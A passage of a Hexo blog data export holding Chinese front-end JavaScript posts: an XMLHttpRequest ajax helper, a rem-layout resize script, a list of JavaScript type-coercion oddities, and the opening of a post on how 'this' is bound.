(options.type || &quot;GET&quot;).toUpperCase();</span><br><span class=\"line\">  options.dataType = options.dataType || &quot;json&quot;;</span><br><span class=\"line\">  var params = formatParams(options.data);</span><br><span class=\"line\"></span><br><span class=\"line\">  //创建 - 非IE6 - 第一步</span><br><span class=\"line\">  if (window.XMLHttpRequest) &#123;</span><br><span class=\"line\">    var xhr = new XMLHttpRequest();</span><br><span class=\"line\">  &#125; else &#123; //IE6及其以下版本浏览器</span><br><span class=\"line\">    var xhr = new ActiveXObject(&apos;Microsoft.XMLHTTP&apos;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //接收 - 第三步</span><br><span class=\"line\">  xhr.onreadystatechange = function () &#123;</span><br><span class=\"line\">    if (xhr.readyState == 4) &#123;</span><br><span class=\"line\">      var status = xhr.status;</span><br><span class=\"line\">      if (status &gt;= 200 &amp;&amp; status &lt; 300) &#123;</span><br><span class=\"line\">        options.success &amp;&amp; options.success(xhr.responseText, xhr.responseXML);</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        options.fail &amp;&amp; options.fail(status);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //连接 和 发送 - 第二步</span><br><span class=\"line\">  if (options.type == &quot;GET&quot;) &#123;</span><br><span class=\"line\">    xhr.open(&quot;GET&quot;, options.url + &quot;?&quot; + params, true);</span><br><span class=\"line\">    xhr.send(null);</span><br><span class=\"line\">  &#125; else if (options.type == &quot;POST&quot;) &#123;</span><br><span class=\"line\">    xhr.open(&quot;POST&quot;, options.url, true);</span><br><span class=\"line\">    //设置表单提交时的内容类型</span><br><span class=\"line\">    xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span><br><span class=\"line\">    xhr.send(params);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//格式化参数</span><br><span class=\"line\">function formatParams(data) &#123;</span><br><span class=\"line\">  var arr = [];</span><br><span class=\"line\">  for (var name in data) &#123;</span><br><span class=\"line\">    arr.push(encodeURIComponent(name) + &quot;=&quot; + encodeURIComponent(data[name]));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  arr.push((&quot;v=&quot; + Math.random()).replace(&quot;.&quot;, &quot;&quot;));</span><br><span class=\"line\">  // console.log(arr.join(&quot;&amp;&quot;));</span><br><span class=\"line\">  return arr.join(&quot;&amp;&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"响应式布局JS事件","date":"2018-04-19T01:23:15.000Z","archives":"样式表","_content":"为解决屏幕分辨率问题，采用事件监听，动态修改 根节点 fontsize \n````\n// getSize(解决rem布局)\n(function(){\n\tgetSize();\n\twindow.addEventListener('resize',getSize);\n\t\n\tfunction getSize(){\n\t\tdocument.documentElement.style.fontSize \n\t\t= document.documentElement.clientWidth/3.75/2+'px';\n\t}\n})()\n````","source":"_posts/FrontEnd/JS/响应式布局JS事件.md","raw":"---\ntitle: 响应式布局JS事件\ndate: 2018-04-19 09:23:15\ntags: 响应式 getSize\narchives: 样式表\ncategories: JS\n---\n为解决屏幕分辨率问题，采用事件监听，动态修改 根节点 fontsize \n````\n// getSize(解决rem布局)\n(function(){\n\tgetSize();\n\twindow.addEventListener('resize',getSize);\n\t\n\tfunction getSize(){\n\t\tdocument.documentElement.style.fontSize \n\t\t= document.documentElement.clientWidth/3.75/2+'px';\n\t}\n})()\n````","slug":"FrontEnd/JS/响应式布局JS事件","published":1,"updated":"2018-09-05T06:33:18.459Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0100a9zodvb8fp4a3h","content":"<p>为解决屏幕分辨率问题，采用事件监听，动态修改 根节点 fontsize<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// getSize(解决rem布局)</span><br><span class=\"line\">(function()&#123;</span><br><span class=\"line\">\tgetSize();</span><br><span class=\"line\">\twindow.addEventListener(&apos;resize&apos;,getSize);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tfunction getSize()&#123;</span><br><span class=\"line\">\t\tdocument.documentElement.style.fontSize </span><br><span class=\"line\">\t\t= document.documentElement.clientWidth/3.75/2+&apos;px&apos;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;)()</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>为解决屏幕分辨率问题，采用事件监听，动态修改 根节点 fontsize<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// getSize(解决rem布局)</span><br><span class=\"line\">(function()&#123;</span><br><span class=\"line\">\tgetSize();</span><br><span class=\"line\">\twindow.addEventListener(&apos;resize&apos;,getSize);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tfunction getSize()&#123;</span><br><span class=\"line\">\t\tdocument.documentElement.style.fontSize </span><br><span class=\"line\">\t\t= document.documentElement.clientWidth/3.75/2+&apos;px&apos;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;)()</span><br></pre></td></tr></table></figure></p>\n"},{"title":"怪异的JS系列","date":"2018-05-05T09:50:36.000Z","archives":"JS特殊情况","_content":"# [怪异的JavaScript系列(一)](https://juejin.im/post/5ade89db6fb9a07aab297b15)\n## [ ]等于![ ]\n    [] == ![] // -> true\n\n**相等(==)判断操作会将两边的类型都转换为数字(number)，然后再比较。**\n\n因为`[]`和`![]`都会转换为`0`。我们可以理解`[]`是一个`数组`，只不过`为空`而已，那么为`true`。右侧`![]`则为`false`。`false`然后转换为数字`0`。`左侧[]`直接`转`换为`数字`，因为`空数组`会转换`为0`，所以尽管我们认为[]为true，这里却变成了0。\n简算过程:\n````\n+[] == +![]\n0 == +false\n0 == 0\ntrue\n````\n\n## true 是 false\n    !!'false' ==  !!'true'  // -> true\n    !!'false' === !!'true' // -> true\n\n**true是一个真值，用1表示；`字符串的“true”则为NaN`。**\n\n    true == 'true'    // -> false\n    false == 'false'  // -> false\n\n**'false'是一个有意义的字符串。**\n\n## baNaNa\n    'b' + 'a' ++ 'a' + 'a' // -> baNaNa\n\n**这是一个旧笑话，不过改进过的。原始的长这样：**\n\n    'foo' ++ 'bar' // -> 'fooNaN'\n\n该表达式以`'foo' + (+'bar')`的形式计算，因为`bar不是数字`，所以转换为`NaN`。    \n\n## NaN不等于NaN\n    NaN === NaN // -> false\n\n根据 === 的算法，我们可以容易理解为什么为false。\n\n## fail\n    (![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]] // -> fail\n\n如果我们仔细观察序列的规律，会发现下面的模式出现很多次：\n\n    (![]+[]) // -> 'false'\n    ![]      // -> false    \n\n因此，我们尝试将`[]`和`false`相加。但是根据内部一些列函数的计算(binary + Operator -> ToPrimitive -> [[DefaultValue]])，右侧的[]最终转换为string：\n\n    (![]+[].toString()) // 'false'\n\n对于一个字符串，我们就可以通过下标来获取对应的字符：\n    \n    'false'[0] // -> 'f'        \n\n剩下的都很直观，除了`i`很取巧。`fail`中的`i`是通过在`falseundefined`中获取第十个下标对应的字符而得到。    \n\n## [ ]包含值，但不是true\n\n## null不等于false\n\n## `document.all`是一个对象，不过是 undefined\n**⚠️这个是前端浏览器API，在Nodejs环境无法使用。**\n\n尽管`document.all`可以返回一个像`数组一样的对象`，可以用来`访问DOM节点`。但是呢，通过`typeof`查看`document.all`，你会惊讶地发现类型是`undefined`。\n\n    document.all instanceof Object // -> true\n    typeof document.all // -> 'undefined'\n\n而且，`document.all`并不等于`undefined`。\n\n    document.all === undefined // -> false\n    document.all === null // -> false\n\n而且，更惊讶的是：\n\n    document.all == null // -> true\n\n`document.all`是一个过去常用的`获取DOM元素`的方法，特别是老版本的IE。但是`从未进入标准`，尽管广泛使用在过去的JS代码中。当`新的API`突出来(比如`document.getElementById`)后，`document.all`就被`淘汰`了。标准委员会不知道怎么处理它。可是因为它已经被广泛使用，所以委员会觉得保留它，但是违背了`JavaScript`的规范。\n\n## 最小值比0还大\n`Number.MIN_VALUE`是最小的数，但是它比`0`还大。\n    \n    Number.MIN_VALUE > 0 // -> true\n\n因为`Number.MIN_VALUE`是`5e-324`。也就是说即使`最小的值`也可以用`浮点数`表示出来，虽然`离0很接近`，但是`依然比0大`。其实最小的数是`Number.NEGATIVE_INFINITY`，尽管它`不是一个实际存在`的数。\n","source":"_posts/FrontEnd/JS/怪异的JS.md","raw":"---\ntitle: 怪异的JS系列\ndate: 2018-05-05 17:50:36\ntags: JS特殊情况判断\narchives: JS特殊情况\ncategories: JS\n---\n# [怪异的JavaScript系列(一)](https://juejin.im/post/5ade89db6fb9a07aab297b15)\n## [ ]等于![ ]\n    [] == ![] // -> true\n\n**相等(==)判断操作会将两边的类型都转换为数字(number)，然后再比较。**\n\n因为`[]`和`![]`都会转换为`0`。我们可以理解`[]`是一个`数组`，只不过`为空`而已，那么为`true`。右侧`![]`则为`false`。`false`然后转换为数字`0`。`左侧[]`直接`转`换为`数字`，因为`空数组`会转换`为0`，所以尽管我们认为[]为true，这里却变成了0。\n简算过程:\n````\n+[] == +![]\n0 == +false\n0 == 0\ntrue\n````\n\n## true 是 false\n    !!'false' ==  !!'true'  // -> true\n    !!'false' === !!'true' // -> true\n\n**true是一个真值，用1表示；`字符串的“true”则为NaN`。**\n\n    true == 'true'    // -> false\n    false == 'false'  // -> false\n\n**'false'是一个有意义的字符串。**\n\n## baNaNa\n    'b' + 'a' ++ 'a' + 'a' // -> baNaNa\n\n**这是一个旧笑话，不过改进过的。原始的长这样：**\n\n    'foo' ++ 'bar' // -> 'fooNaN'\n\n该表达式以`'foo' + (+'bar')`的形式计算，因为`bar不是数字`，所以转换为`NaN`。    \n\n## NaN不等于NaN\n    NaN === NaN // -> false\n\n根据 === 的算法，我们可以容易理解为什么为false。\n\n## fail\n    (![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]] // -> fail\n\n如果我们仔细观察序列的规律，会发现下面的模式出现很多次：\n\n    (![]+[]) // -> 'false'\n    ![]      // -> false    \n\n因此，我们尝试将`[]`和`false`相加。但是根据内部一些列函数的计算(binary + Operator -> ToPrimitive -> [[DefaultValue]])，右侧的[]最终转换为string：\n\n    (![]+[].toString()) // 'false'\n\n对于一个字符串，我们就可以通过下标来获取对应的字符：\n    \n    'false'[0] // -> 'f'        \n\n剩下的都很直观，除了`i`很取巧。`fail`中的`i`是通过在`falseundefined`中获取第十个下标对应的字符而得到。    \n\n## [ ]包含值，但不是true\n\n## null不等于false\n\n## `document.all`是一个对象，不过是 undefined\n**⚠️这个是前端浏览器API，在Nodejs环境无法使用。**\n\n尽管`document.all`可以返回一个像`数组一样的对象`，可以用来`访问DOM节点`。但是呢，通过`typeof`查看`document.all`，你会惊讶地发现类型是`undefined`。\n\n    document.all instanceof Object // -> true\n    typeof document.all // -> 'undefined'\n\n而且，`document.all`并不等于`undefined`。\n\n    document.all === undefined // -> false\n    document.all === null // -> false\n\n而且，更惊讶的是：\n\n    document.all == null // -> true\n\n`document.all`是一个过去常用的`获取DOM元素`的方法，特别是老版本的IE。但是`从未进入标准`，尽管广泛使用在过去的JS代码中。当`新的API`突出来(比如`document.getElementById`)后，`document.all`就被`淘汰`了。标准委员会不知道怎么处理它。可是因为它已经被广泛使用，所以委员会觉得保留它，但是违背了`JavaScript`的规范。\n\n## 最小值比0还大\n`Number.MIN_VALUE`是最小的数，但是它比`0`还大。\n    \n    Number.MIN_VALUE > 0 // -> true\n\n因为`Number.MIN_VALUE`是`5e-324`。也就是说即使`最小的值`也可以用`浮点数`表示出来，虽然`离0很接近`，但是`依然比0大`。其实最小的数是`Number.NEGATIVE_INFINITY`，尽管它`不是一个实际存在`的数。\n","slug":"FrontEnd/JS/怪异的JS","published":1,"updated":"2018-09-05T06:33:18.459Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0300aczodven2ttdnq","content":"<h1 id=\"怪异的JavaScript系列-一\"><a href=\"#怪异的JavaScript系列-一\" class=\"headerlink\" title=\"怪异的JavaScript系列(一)\"></a><a href=\"https://juejin.im/post/5ade89db6fb9a07aab297b15\" target=\"_blank\" rel=\"noopener\">怪异的JavaScript系列(一)</a></h1><h2 id=\"等于\"><a href=\"#等于\" class=\"headerlink\" title=\"[ ]等于![ ]\"></a>[ ]等于![ ]</h2><pre><code>[] == ![] // -&gt; true\n</code></pre><p><strong>相等(==)判断操作会将两边的类型都转换为数字(number)，然后再比较。</strong></p>\n<p>因为<code>[]</code>和<code>![]</code>都会转换为<code>0</code>。我们可以理解<code>[]</code>是一个<code>数组</code>，只不过<code>为空</code>而已，那么为<code>true</code>。右侧<code>![]</code>则为<code>false</code>。<code>false</code>然后转换为数字<code>0</code>。<code>左侧[]</code>直接<code>转</code>换为<code>数字</code>，因为<code>空数组</code>会转换<code>为0</code>，所以尽管我们认为[]为true，这里却变成了0。<br>简算过程:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+[] == +![]</span><br><span class=\"line\">0 == +false</span><br><span class=\"line\">0 == 0</span><br><span class=\"line\">true</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"true-是-false\"><a href=\"#true-是-false\" class=\"headerlink\" title=\"true 是 false\"></a>true 是 false</h2><pre><code>!!&apos;false&apos; ==  !!&apos;true&apos;  // -&gt; true\n!!&apos;false&apos; === !!&apos;true&apos; // -&gt; true\n</code></pre><p><strong>true是一个真值，用1表示；<code>字符串的“true”则为NaN</code>。</strong></p>\n<pre><code>true == &apos;true&apos;    // -&gt; false\nfalse == &apos;false&apos;  // -&gt; false\n</code></pre><p><strong>‘false’是一个有意义的字符串。</strong></p>\n<h2 id=\"baNaNa\"><a href=\"#baNaNa\" class=\"headerlink\" title=\"baNaNa\"></a>baNaNa</h2><pre><code>&apos;b&apos; + &apos;a&apos; ++ &apos;a&apos; + &apos;a&apos; // -&gt; baNaNa\n</code></pre><p><strong>这是一个旧笑话，不过改进过的。原始的长这样：</strong></p>\n<pre><code>&apos;foo&apos; ++ &apos;bar&apos; // -&gt; &apos;fooNaN&apos;\n</code></pre><p>该表达式以<code>&#39;foo&#39; + (+&#39;bar&#39;)</code>的形式计算，因为<code>bar不是数字</code>，所以转换为<code>NaN</code>。    </p>\n<h2 id=\"NaN不等于NaN\"><a href=\"#NaN不等于NaN\" class=\"headerlink\" title=\"NaN不等于NaN\"></a>NaN不等于NaN</h2><pre><code>NaN === NaN // -&gt; false\n</code></pre><p>根据 === 的算法，我们可以容易理解为什么为false。</p>\n<h2 id=\"fail\"><a href=\"#fail\" class=\"headerlink\" title=\"fail\"></a>fail</h2><pre><code>(![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]] // -&gt; fail\n</code></pre><p>如果我们仔细观察序列的规律，会发现下面的模式出现很多次：</p>\n<pre><code>(![]+[]) // -&gt; &apos;false&apos;\n![]      // -&gt; false    \n</code></pre><p>因此，我们尝试将<code>[]</code>和<code>false</code>相加。但是根据内部一些列函数的计算(binary + Operator -&gt; ToPrimitive -&gt; [[DefaultValue]])，右侧的[]最终转换为string：</p>\n<pre><code>(![]+[].toString()) // &apos;false&apos;\n</code></pre><p>对于一个字符串，我们就可以通过下标来获取对应的字符：</p>\n<pre><code>&apos;false&apos;[0] // -&gt; &apos;f&apos;        \n</code></pre><p>剩下的都很直观，除了<code>i</code>很取巧。<code>fail</code>中的<code>i</code>是通过在<code>falseundefined</code>中获取第十个下标对应的字符而得到。    </p>\n<h2 id=\"包含值，但不是true\"><a href=\"#包含值，但不是true\" class=\"headerlink\" title=\"[ ]包含值，但不是true\"></a>[ ]包含值，但不是true</h2><h2 id=\"null不等于false\"><a href=\"#null不等于false\" class=\"headerlink\" title=\"null不等于false\"></a>null不等于false</h2><h2 id=\"document-all是一个对象，不过是-undefined\"><a href=\"#document-all是一个对象，不过是-undefined\" class=\"headerlink\" title=\"document.all是一个对象，不过是 undefined\"></a><code>document.all</code>是一个对象，不过是 undefined</h2><p><strong>⚠️这个是前端浏览器API，在Nodejs环境无法使用。</strong></p>\n<p>尽管<code>document.all</code>可以返回一个像<code>数组一样的对象</code>，可以用来<code>访问DOM节点</code>。但是呢，通过<code>typeof</code>查看<code>document.all</code>，你会惊讶地发现类型是<code>undefined</code>。</p>\n<pre><code>document.all instanceof Object // -&gt; true\ntypeof document.all // -&gt; &apos;undefined&apos;\n</code></pre><p>而且，<code>document.all</code>并不等于<code>undefined</code>。</p>\n<pre><code>document.all === undefined // -&gt; false\ndocument.all === null // -&gt; false\n</code></pre><p>而且，更惊讶的是：</p>\n<pre><code>document.all == null // -&gt; true\n</code></pre><p><code>document.all</code>是一个过去常用的<code>获取DOM元素</code>的方法，特别是老版本的IE。但是<code>从未进入标准</code>，尽管广泛使用在过去的JS代码中。当<code>新的API</code>突出来(比如<code>document.getElementById</code>)后，<code>document.all</code>就被<code>淘汰</code>了。标准委员会不知道怎么处理它。可是因为它已经被广泛使用，所以委员会觉得保留它，但是违背了<code>JavaScript</code>的规范。</p>\n<h2 id=\"最小值比0还大\"><a href=\"#最小值比0还大\" class=\"headerlink\" title=\"最小值比0还大\"></a>最小值比0还大</h2><p><code>Number.MIN_VALUE</code>是最小的数，但是它比<code>0</code>还大。</p>\n<pre><code>Number.MIN_VALUE &gt; 0 // -&gt; true\n</code></pre><p>因为<code>Number.MIN_VALUE</code>是<code>5e-324</code>。也就是说即使<code>最小的值</code>也可以用<code>浮点数</code>表示出来，虽然<code>离0很接近</code>，但是<code>依然比0大</code>。其实最小的数是<code>Number.NEGATIVE_INFINITY</code>，尽管它<code>不是一个实际存在</code>的数。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"怪异的JavaScript系列-一\"><a href=\"#怪异的JavaScript系列-一\" class=\"headerlink\" title=\"怪异的JavaScript系列(一)\"></a><a href=\"https://juejin.im/post/5ade89db6fb9a07aab297b15\" target=\"_blank\" rel=\"noopener\">怪异的JavaScript系列(一)</a></h1><h2 id=\"等于\"><a href=\"#等于\" class=\"headerlink\" title=\"[ ]等于![ ]\"></a>[ ]等于![ ]</h2><pre><code>[] == ![] // -&gt; true\n</code></pre><p><strong>相等(==)判断操作会将两边的类型都转换为数字(number)，然后再比较。</strong></p>\n<p>因为<code>[]</code>和<code>![]</code>都会转换为<code>0</code>。我们可以理解<code>[]</code>是一个<code>数组</code>，只不过<code>为空</code>而已，那么为<code>true</code>。右侧<code>![]</code>则为<code>false</code>。<code>false</code>然后转换为数字<code>0</code>。<code>左侧[]</code>直接<code>转</code>换为<code>数字</code>，因为<code>空数组</code>会转换<code>为0</code>，所以尽管我们认为[]为true，这里却变成了0。<br>简算过程:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+[] == +![]</span><br><span class=\"line\">0 == +false</span><br><span class=\"line\">0 == 0</span><br><span class=\"line\">true</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"true-是-false\"><a href=\"#true-是-false\" class=\"headerlink\" title=\"true 是 false\"></a>true 是 false</h2><pre><code>!!&apos;false&apos; ==  !!&apos;true&apos;  // -&gt; true\n!!&apos;false&apos; === !!&apos;true&apos; // -&gt; true\n</code></pre><p><strong>true是一个真值，用1表示；<code>字符串的“true”则为NaN</code>。</strong></p>\n<pre><code>true == &apos;true&apos;    // -&gt; false\nfalse == &apos;false&apos;  // -&gt; false\n</code></pre><p><strong>‘false’是一个有意义的字符串。</strong></p>\n<h2 id=\"baNaNa\"><a href=\"#baNaNa\" class=\"headerlink\" title=\"baNaNa\"></a>baNaNa</h2><pre><code>&apos;b&apos; + &apos;a&apos; ++ &apos;a&apos; + &apos;a&apos; // -&gt; baNaNa\n</code></pre><p><strong>这是一个旧笑话，不过改进过的。原始的长这样：</strong></p>\n<pre><code>&apos;foo&apos; ++ &apos;bar&apos; // -&gt; &apos;fooNaN&apos;\n</code></pre><p>该表达式以<code>&#39;foo&#39; + (+&#39;bar&#39;)</code>的形式计算，因为<code>bar不是数字</code>，所以转换为<code>NaN</code>。    </p>\n<h2 id=\"NaN不等于NaN\"><a href=\"#NaN不等于NaN\" class=\"headerlink\" title=\"NaN不等于NaN\"></a>NaN不等于NaN</h2><pre><code>NaN === NaN // -&gt; false\n</code></pre><p>根据 === 的算法，我们可以容易理解为什么为false。</p>\n<h2 id=\"fail\"><a href=\"#fail\" class=\"headerlink\" title=\"fail\"></a>fail</h2><pre><code>(![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]] // -&gt; fail\n</code></pre><p>如果我们仔细观察序列的规律，会发现下面的模式出现很多次：</p>\n<pre><code>(![]+[]) // -&gt; &apos;false&apos;\n![]      // -&gt; false    \n</code></pre><p>因此，我们尝试将<code>[]</code>和<code>false</code>相加。但是根据内部一些列函数的计算(binary + Operator -&gt; ToPrimitive -&gt; [[DefaultValue]])，右侧的[]最终转换为string：</p>\n<pre><code>(![]+[].toString()) // &apos;false&apos;\n</code></pre><p>对于一个字符串，我们就可以通过下标来获取对应的字符：</p>\n<pre><code>&apos;false&apos;[0] // -&gt; &apos;f&apos;        \n</code></pre><p>剩下的都很直观，除了<code>i</code>很取巧。<code>fail</code>中的<code>i</code>是通过在<code>falseundefined</code>中获取第十个下标对应的字符而得到。    </p>\n<h2 id=\"包含值，但不是true\"><a href=\"#包含值，但不是true\" class=\"headerlink\" title=\"[ ]包含值，但不是true\"></a>[ ]包含值，但不是true</h2><h2 id=\"null不等于false\"><a href=\"#null不等于false\" class=\"headerlink\" title=\"null不等于false\"></a>null不等于false</h2><h2 id=\"document-all是一个对象，不过是-undefined\"><a href=\"#document-all是一个对象，不过是-undefined\" class=\"headerlink\" title=\"document.all是一个对象，不过是 undefined\"></a><code>document.all</code>是一个对象，不过是 undefined</h2><p><strong>⚠️这个是前端浏览器API，在Nodejs环境无法使用。</strong></p>\n<p>尽管<code>document.all</code>可以返回一个像<code>数组一样的对象</code>，可以用来<code>访问DOM节点</code>。但是呢，通过<code>typeof</code>查看<code>document.all</code>，你会惊讶地发现类型是<code>undefined</code>。</p>\n<pre><code>document.all instanceof Object // -&gt; true\ntypeof document.all // -&gt; &apos;undefined&apos;\n</code></pre><p>而且，<code>document.all</code>并不等于<code>undefined</code>。</p>\n<pre><code>document.all === undefined // -&gt; false\ndocument.all === null // -&gt; false\n</code></pre><p>而且，更惊讶的是：</p>\n<pre><code>document.all == null // -&gt; true\n</code></pre><p><code>document.all</code>是一个过去常用的<code>获取DOM元素</code>的方法，特别是老版本的IE。但是<code>从未进入标准</code>，尽管广泛使用在过去的JS代码中。当<code>新的API</code>突出来(比如<code>document.getElementById</code>)后，<code>document.all</code>就被<code>淘汰</code>了。标准委员会不知道怎么处理它。可是因为它已经被广泛使用，所以委员会觉得保留它，但是违背了<code>JavaScript</code>的规范。</p>\n<h2 id=\"最小值比0还大\"><a href=\"#最小值比0还大\" class=\"headerlink\" title=\"最小值比0还大\"></a>最小值比0还大</h2><p><code>Number.MIN_VALUE</code>是最小的数，但是它比<code>0</code>还大。</p>\n<pre><code>Number.MIN_VALUE &gt; 0 // -&gt; true\n</code></pre><p>因为<code>Number.MIN_VALUE</code>是<code>5e-324</code>。也就是说即使<code>最小的值</code>也可以用<code>浮点数</code>表示出来，虽然<code>离0很接近</code>，但是<code>依然比0大</code>。其实最小的数是<code>Number.NEGATIVE_INFINITY</code>，尽管它<code>不是一个实际存在</code>的数。</p>\n"},{"title":"深入理解JS中this","date":"2018-06-12T06:34:52.000Z","_content":"# [转]深入理解javascript之this\n  (2018年2月28日 16:38:18)\n\n  javascript中的`this`含义非常丰富,它可以是`全局对象`,`当前对象`或者是`任意对象`,这都`取决于`**函数的调用方式**。\n  函数有`以下几种`调用方式：`作为对象方法调用`、`作为函数调用`、`作为构造函数调用`、`apply`或`call`调用。\n\n  + **对象方法调用**  \n   作为`对象方法`调用的时候,`this`会被`绑定到该对象`。\n   例：略\n\n  + **强调**:  \n   `this`是在函数`执行时`去获取对应的值,而不是函数`定义时`。即使是`对象方法`调用,如果该方法的`函数属性`以`函数名的形式`传入`其他作用域`,也会`改变this`的指向。我举一个例子：\n\n  + **函数调用**  \n   函数也可以`直接被调用`,这个时候`this`被`绑定到了全局对象`。\n\n  + **构造函数调用**  \n   在javascript中自己创建`构造函数`时可以`利用this`来指向新创建的对象上。这样就可以避免函数中的this指向全局了。\n  \n  + **apply或call调用**  \n   这两个方法可以`切换`函数执行的`上下文环境`,也就是`改变this绑定的对象`。apply和call比较类似,区别在于传入参数时一个要求是数组,一个要求是分开传入。所以我们以apply为例：\n  \n  + **箭头函数调用**  \n   `补充`:ES6中 `箭头函数`的`this始终指向函数定义时的this, 而非执行时`。  \n   我们通过一个例子来理解:  \n   还需要**注意**一点的就是这个`this不会改变指向对象`,我们知道`call`和`apply`可以改变`this`的指向,但是在`箭头函数中无效`的。\n  \n  + **箭头函数的特性**  \n   箭头函数内部没有`constructor`方法,也没有`prototype`,所以不支持`new`操作。但是它对`this`的处理与一般的普通函数不一样。箭头函数的`this`始终指向函数`定义时`的 `this`,而非执行时。我们通过一个例子来理解:\n\n---\n[阅读原文](http://blog.csdn.net/mevicky/article/details/46659273)\n","source":"_posts/FrontEnd/JS/深入理解JS中this.md","raw":"---\ntitle: 深入理解JS中this\ndate: 2018-06-12 14:34:52\ntags: JS-this\ncategories: JavaScript\n---\n# [转]深入理解javascript之this\n  (2018年2月28日 16:38:18)\n\n  javascript中的`this`含义非常丰富,它可以是`全局对象`,`当前对象`或者是`任意对象`,这都`取决于`**函数的调用方式**。\n  函数有`以下几种`调用方式：`作为对象方法调用`、`作为函数调用`、`作为构造函数调用`、`apply`或`call`调用。\n\n  + **对象方法调用**  \n   作为`对象方法`调用的时候,`this`会被`绑定到该对象`。\n   例：略\n\n  + **强调**:  \n   `this`是在函数`执行时`去获取对应的值,而不是函数`定义时`。即使是`对象方法`调用,如果该方法的`函数属性`以`函数名的形式`传入`其他作用域`,也会`改变this`的指向。我举一个例子：\n\n  + **函数调用**  \n   函数也可以`直接被调用`,这个时候`this`被`绑定到了全局对象`。\n\n  + **构造函数调用**  \n   在javascript中自己创建`构造函数`时可以`利用this`来指向新创建的对象上。这样就可以避免函数中的this指向全局了。\n  \n  + **apply或call调用**  \n   这两个方法可以`切换`函数执行的`上下文环境`,也就是`改变this绑定的对象`。apply和call比较类似,区别在于传入参数时一个要求是数组,一个要求是分开传入。所以我们以apply为例：\n  \n  + **箭头函数调用**  \n   `补充`:ES6中 `箭头函数`的`this始终指向函数定义时的this, 而非执行时`。  \n   我们通过一个例子来理解:  \n   还需要**注意**一点的就是这个`this不会改变指向对象`,我们知道`call`和`apply`可以改变`this`的指向,但是在`箭头函数中无效`的。\n  \n  + **箭头函数的特性**  \n   箭头函数内部没有`constructor`方法,也没有`prototype`,所以不支持`new`操作。但是它对`this`的处理与一般的普通函数不一样。箭头函数的`this`始终指向函数`定义时`的 `this`,而非执行时。我们通过一个例子来理解:\n\n---\n[阅读原文](http://blog.csdn.net/mevicky/article/details/46659273)\n","slug":"FrontEnd/JS/深入理解JS中this","published":1,"updated":"2018-09-05T06:33:18.460Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0400afzodvzyoma3hm","content":"<h1 id=\"转-深入理解javascript之this\"><a href=\"#转-深入理解javascript之this\" class=\"headerlink\" title=\"[转]深入理解javascript之this\"></a>[转]深入理解javascript之this</h1><p>  (2018年2月28日 16:38:18)</p>\n<p>  javascript中的<code>this</code>含义非常丰富,它可以是<code>全局对象</code>,<code>当前对象</code>或者是<code>任意对象</code>,这都<code>取决于</code><strong>函数的调用方式</strong>。<br>  